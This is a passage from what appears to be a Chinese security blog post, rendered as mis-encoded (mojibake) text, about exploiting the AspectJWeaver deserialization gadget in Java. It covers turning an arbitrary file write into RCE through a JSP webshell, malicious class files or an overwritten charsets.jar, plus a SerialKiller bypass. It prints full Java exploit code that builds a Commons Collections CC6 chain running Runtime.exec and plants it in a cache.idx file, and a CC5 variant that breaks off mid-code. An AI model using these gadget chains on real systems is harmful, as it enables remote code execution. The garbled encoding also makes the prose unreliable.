æ˜¯ä¸€ä¸ªç‰¹å®šçš„å­—èŠ‚æ•°ç»„ï¼ˆSimpleCache.SAME_BYTESï¼‰ï¼Œåˆ™å°† path è®¾ç½®ä¸ºSAME_BYTES_STRINGã€‚</p><p>SimpleCache.SAME_BYTESä¸ºä¸‹é¢çš„è¿™ä¸ªå€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] SAME_BYTES = SAME_BYTES_STRING.getBytes();<br></code></pre></td></tr></table></figure><p>ä¸€é€šåˆ†ææ˜¾ç„¶ä¼šè¿›åˆ°elseï¼Œè·Ÿè¿›<code>writeToPath</code>ï¼Œè¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å°†å­—èŠ‚æ•°ç»„å†™å…¥åˆ°æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ä¸­ã€‚å®ƒåˆ›å»ºä¸€ä¸ªæ–‡ä»¶è¾“å‡ºæµå¯¹è±¡ï¼Œå°†å­—èŠ‚æ•°ç»„<strong>å†™å…¥åˆ°æ–‡ä»¶</strong>ä¸­ï¼Œç„¶ååˆ·æ–°è¾“å‡ºæµå¹¶å…³é—­å®ƒã€‚æœ€åï¼Œè¿”å›å†™å…¥çš„æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚ </p><p>åœ¨return fullPathå¤„è®¾æ–­ï¼Œæ³¨æ„åˆ°å†™å…¥ä»¥åŠå–åˆ°çš„æ–‡ä»¶è·¯å¾„å°±æ˜¯ç”±this.folderï¼ŒFile.separatorå’Œkeyæ‹¼æ¥è€Œæˆçš„ï¼š</p><p><img src="/2024/08/09/AspectJWeaver/image-20240809194209784.png" alt="image-20240809194209784"></p><p><code>writeToPath</code>å®ç°å†™æ–‡ä»¶ï¼Œfolderå’Œkeyæ‹¼æ¥ç»„æˆæ–‡ä»¶å…¨è·¯å¾„ã€‚ä¼ å…¥<code>StoreableCachingMap#put</code>çš„keyä¸ºæ–‡ä»¶åï¼Œvalueä¸ºå†™å…¥çš„å†…å®¹ã€‚</p><p>åªè¦ä»¤ä¼ å…¥çš„mapä¸ºStoreableCachingMapå³å¯è§¦å‘StoreableCachingMap#put</p><p>è€Œvalueçš„å€¼ä¹Ÿæ˜¯æˆ‘ä»¬é€šè¿‡ConstantTransformerå¯æ§çš„ï¼Œå¦‚æœkeyä¹Ÿå¯æ§ï¼Œé‚£ä¹ˆæ–‡ä»¶å†…å®¹å’Œè·¯å¾„éƒ½å°†ç”±æˆ‘ä»¬ä¸ºæ‰€æ¬²ä¸ºã€‚</p><p>ä½†å•çº¯çš„å†™æ–‡ä»¶å±å®³ä¸å¤§ï¼Œè¿˜å¾—é…åˆå…¶ä»–æ¼æ´æ‰“ã€‚é¢˜ç›®ä¸­é‡åˆ°ä¹Ÿåªä¼šæˆä¸ºä¸€ä¸ªå°trickã€‚</p><p>å¦‚ä½•å°†å†™æ–‡ä»¶å‡çº§ä¸ºRCEå‘¢</p><h3 id="Jsp-WebShell"><a href="#Jsp-WebShell" class="headerlink" title="Jsp WebShell"></a>Jsp WebShell</h3><p>è‹¥ç›®æ ‡åº”ç”¨æ”¯æŒè§£æJSPï¼Œå¯ä»¥ç›´æ¥å†™ä¸ªJsp WebShellã€‚</p><h3 id="class-file-in-WEB-INF-classes"><a href="#class-file-in-WEB-INF-classes" class="headerlink" title="class file in WEB-INF&#x2F;classes"></a>class file in WEB-INF&#x2F;classes</h3><p>æ—¢ç„¶æœ‰ååºåˆ—åŒ–å…¥å£ï¼Œåœ¨<code>WEB-INF/classes</code>ä¸‹å†™å…¥ä¸€ä¸ªæ¶æ„çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œåœ¨<code>readObject</code>æˆ–é™æ€ä»£ç å—ä¸­ç¼–å†™å‘½ä»¤æ‰§è¡Œï¼Œç„¶åå†ååºåˆ—åŒ–è¿™ä¸ªç±»ã€‚è‹¥æœ‰å¾€<code>JAVA_HOME</code>å†™çš„æƒé™ï¼Œå¯ä»¥å¾€<code>jre/classes</code>å†™å…¥ç¼–è¯‘å¥½çš„classã€‚</p><h3 id="FatJar-under-SpringBoot"><a href="#FatJar-under-SpringBoot" class="headerlink" title="FatJar under SpringBoot"></a>FatJar under SpringBoot</h3><p>ç°å¾ˆå¤šåº”ç”¨éƒ½é‡‡ç”¨äº†SpringBootæ‰“åŒ…æˆä¸€ä¸ªjaræˆ–è€…waråŒ…æ”¾åˆ°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œæˆ‘ä»¬æ— æ³•å¾€classpathå†™jspæˆ–å­—èŠ‚ç æ–‡ä»¶äº†ï¼Œé‚£å°±è€ƒè™‘è¦†ç›–jdkçš„ç³»ç»Ÿç±»ã€‚</p><p>ç”±äºjvmçš„ç±»åŠ è½½æœºåˆ¶ï¼Œå¹¶ä¸ä¼šä¸€æ¬¡æ€§æŠŠæ‰€æœ‰jdkä¸­çš„jaråŒ…éƒ½è¿›è¡ŒåŠ è½½ã€‚</p><p>å¾€ç›®æ ‡ç¯å¢ƒå†™å…¥&#x2F;jre&#x2F;lib&#x2F;charsets.jarè¿›è¡Œè¦†ç›–ï¼Œç„¶ååœ¨request headerä¸­åŠ å…¥ç‰¹æ®Šå¤´éƒ¨ï¼Œæ­¤æ—¶ç”±äºç»™å®šäº†å­—ç¬¦ç¼–ç ï¼Œä¼šè®©jvmå»åŠ è½½charset.jarï¼Œä»è€Œè§¦å‘æ¶æ„ä»£ç ã€‚</p><p>è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹æ˜¯ç›®æ ‡$JAVA_HOMEæœªçŸ¥ï¼Œéœ€ä¸€ä¸ªä¸ªå°è¯•ã€‚</p><p>å¯ä»¥å‚è€ƒ<a href="https://landgrey.me/blog/22/">LandGreyâ€™s Blog</a></p><h2 id="Bypass-SerialKiller"><a href="#Bypass-SerialKiller" class="headerlink" title="Bypass SerialKiller"></a>Bypass SerialKiller</h2><p>åˆ©ç”¨é“¾ä¸­çš„<code>ConstantTransformer</code>åœ¨<code>SerialKiller</code>ä¸­è¢«banäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/ikkisoft/SerialKiller<br></code></pre></td></tr></table></figure><p>éœ€è¦æ‰¾ä¸€ä¸ªå’Œ<code>ConstantTransformer</code>æ•ˆæœç­‰åŒçš„<code>Transformer</code></p><ul><li>ï¼ˆXï¼‰<code>StringValueTransformer</code></li></ul><p><code>transform</code>è¿”å›è¾“å…¥å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œä¼šè°ƒç”¨<code>toString()</code></p><p><img src="/2024/08/09/AspectJWeaver/image-20240809193140265.png" alt="image-20240809193140265"></p><p>ä½†åé¢å†™æ–‡ä»¶æ—¶ä¼šæŠŠvalueå¼ºè½¬ä¸º<code>byte[]</code>ï¼Œè€Œ<code>String</code>å¼ºè½¬ä¸äº†<code>byte[]</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æˆåŠŸã€‚</p><ul><li>ï¼ˆâˆšï¼‰<code>FactoryTransformer</code>+<code>ConstantFactory</code></li></ul><p><img src="/2024/08/09/AspectJWeaver/image-20240809193242920.png" alt="image-20240809193242920"></p><p><img src="/2024/08/09/AspectJWeaver/image-20240809193258234.png" alt="image-20240809193258234"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> FactoryTransformer.getInstance(ConstantFactory.getInstance(<span class="hljs-string">&quot;666&quot;</span>.getBytes(StandardCharsets.UTF_8)));<br></code></pre></td></tr></table></figure><h2 id="Forward-Deser"><a href="#Forward-Deser" class="headerlink" title="Forward Deser"></a>Forward Deser</h2><p>åˆ©ç”¨<code>AspectJWeaver</code>ä»»æ„æ–‡ä»¶å†™åï¼Œå‘ç°åŒç›®å½•ä¸‹å‡ºç°äº†ä¸€ä¸ª<code>cache.idx</code>æ–‡ä»¶</p><p><code>StorableCachingMap#put</code>ä¸­è°ƒç”¨å®Œ<code>writeToPath</code>åç´§æ¥ç€è°ƒç”¨äº†<code>storeMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">storeMap</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    <span class="hljs-keyword">if</span> ((now - lastStored ) &lt; storingTimer)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(folder + File.separator + CACHENAMEIDX);;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file));<br>        <span class="hljs-comment">// Deserialize the object</span><br>        out.writeObject(<span class="hljs-built_in">this</span>);<br>        out.close();<br>        lastStored = now;<br>    &#125; <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è·å–å½“å‰ç³»ç»Ÿæ—¶é—´ï¼Œè‹¥å’Œä¸Šæ¬¡å­˜å‚¨æ—¶é—´çš„æ—¶é—´å·®å¤§äº<code>storingTimer</code>ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶<code>cache.idx</code>ï¼Œå¹¶å°†<code>this</code>åºåˆ—åŒ–å†™å…¥ã€‚</p><p>æœ‰åºåˆ—åŒ–çš„åœ°æ–¹å¿…ç„¶æœ‰ååºåˆ—åŒ–ï¼Œ<code>StorableCachingMap#init</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StoreableCachingMap <span class="hljs-title function_">init</span><span class="hljs-params">(String folder)</span> &#123;<br>    <span class="hljs-keyword">return</span> init(folder,DEF_STORING_TIMER);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StoreableCachingMap <span class="hljs-title function_">init</span><span class="hljs-params">(String folder, <span class="hljs-type">int</span> storingTimer)</span> &#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(folder + File.separator + CACHENAMEIDX);<br>    <span class="hljs-keyword">if</span> (file.exists()) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file));<br>            <span class="hljs-comment">// Deserialize the object</span><br>            <span class="hljs-type">StoreableCachingMap</span> <span class="hljs-variable">sm</span> <span class="hljs-operator">=</span> (StoreableCachingMap) in.readObject();<br>            sm.initTrace();<br>            in.close();<br>            <span class="hljs-keyword">return</span> sm;<br>        &#125; <span class="hljs-comment">// ...</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StoreableCachingMap</span>(folder,storingTimer);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯»å–äº†<code>cache.idx</code>å¹¶è¿›è¡Œååºåˆ—åŒ–ã€‚æ¥ç€çœ‹å“ªé‡Œè°ƒç”¨äº†<code>StoreableCachingMap#init</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">SimpleCache</span><span class="hljs-params">(String folder, <span class="hljs-type">boolean</span> enabled)</span> &#123;<br>    <span class="hljs-built_in">this</span>.enabled = enabled;<br><br>    cacheMap = Collections.synchronizedMap(StoreableCachingMap.init(folder));<br><br>    <span class="hljs-keyword">if</span> (enabled) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">generatedCachePath</span> <span class="hljs-operator">=</span> folder + File.separator + GENERATED_CACHE_SUBFOLDER;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span> (generatedCachePath);<br>        <span class="hljs-keyword">if</span> (!f.exists())&#123;<br>            f.mkdir();<br>        &#125;<br>        generatedCache = Collections.synchronizedMap(StoreableCachingMap.init(generatedCachePath,<span class="hljs-number">0</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨<code>SimpleCache</code>çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨<code>StoreableCachingMap#init</code>ä¹Ÿå¾ˆå¥½ç†è§£ã€‚</p><p>é¡¾åæ€ä¹‰è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªç¼“å­˜ç±»ï¼Œ<code>cacheMap</code>æˆå‘˜å³å…¶å†…éƒ¨ç±»<code>StoreableCachingMap</code>ï¼Œå……å½“äº†ä¸€ä¸ªå†…å­˜å±‚é¢çš„é”®å€¼å¯¹ç¼“å­˜ï¼Œå½“ç„¶å®ƒæ”¯æŒæŒä¹…åŒ–å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡å†™å…¥ç¼“å­˜ï¼ˆ<code>StoreableCachingMap#put</code>ï¼‰æ—¶ï¼Œåˆ¤æ–­å’Œä¸Šæ¬¡å­˜å‚¨æ—¶é—´çš„æ—¶é—´å·®æ˜¯å¦è¶…è¿‡<code>storingTimer</code>å­˜å‚¨è®¡æ—¶å™¨ï¼Œè¶…è¿‡åˆ™è¿›è¡ŒæŒä¹…åŒ–æ“ä½œï¼Œå­˜å‚¨æ ¼å¼æ˜¯åºåˆ—åŒ–æ•°æ®ï¼Œå­˜å‚¨æ–‡ä»¶ä¸º<code>cache.idx</code>ã€‚</p><p>ä¸‹æ¬¡éœ€è¦æ¢å¤åˆ°å†…å­˜çš„æ—¶å€™ï¼Œåªéœ€é‡æ–°æ„é€ ä¸€ä¸ª<code>SimpleCache</code>å¯¹è±¡å³å¯ï¼Œå®ƒä¼šè°ƒç”¨<code>StoreableCachingMap#init</code>å¯¹æŒä¹…åŒ–æ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°åŸæ¥çš„<code>cacheMap</code>ã€‚</p><p>æ€è·¯åˆ°è¿™é‡Œå°±å¾ˆæ˜æ˜¾äº†ï¼Œå…ˆç”¨<code>AspectJWeaver</code>å¾€<code>cache.idx</code>å†™å…¥æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œå†é€šè¿‡CCé“¾è§¦å‘æ„é€ å‡½æ•°ã€‚</p><p>ä¸ºäº†é˜²æ­¢å†™å…¥æ–‡ä»¶åï¼Œ<code>storeMap</code>åˆé©¬ä¸Šé‡å†™äº†æˆ‘ä»¬çš„<code>cache.idx</code>ï¼Œè®¾ç½®<code>storingTimer</code>ä¸ºç¨å¾®å¤§ä¸€ç‚¹çš„å€¼ã€‚</p><p>å¾ˆå¯æƒœï¼Œä¸ç®¡æ˜¯<code>InstantiateTransformer</code>è¿˜æ˜¯<code>InstantiateFactory</code>ï¼Œéƒ½è¦æ±‚ç›®æ ‡ç±»çš„æ„é€ æ–¹æ³•éœ€è¦æ˜¯<code>public</code></p><p>åº”è¯¥èƒ½é…åˆå…¶ä»–æ¼æ´æ‰“ï¼Œæ¯”å¦‚<code>SnakeYaml</code></p><p>è´´ä¸€ä¸ªå†™CC6åºåˆ—åŒ–æ•°æ®çš„payloadï¼Œæ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨<code>SimpleCache</code>æ„é€ å™¨çš„é—®é¢˜äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:/&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cache.idx&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (Map) constructor.newInstance(path, <span class="hljs-number">6000000</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> FactoryTransformer.getInstance(ConstantFactory.getInstance(CC6()));<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, fileName);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setValue(val, <span class="hljs-string">&quot;val&quot;</span>, entry);<br>        ser(val);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        objectOutputStream.writeObject(o);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CC6() <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;b&quot;</span>);<br><br>        setValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CC5æ”¹é“¾"><a href="#CC5æ”¹é“¾" class="headerlink" title="CC5æ”¹é“¾"></a>CC5æ”¹é“¾</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AJCC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span 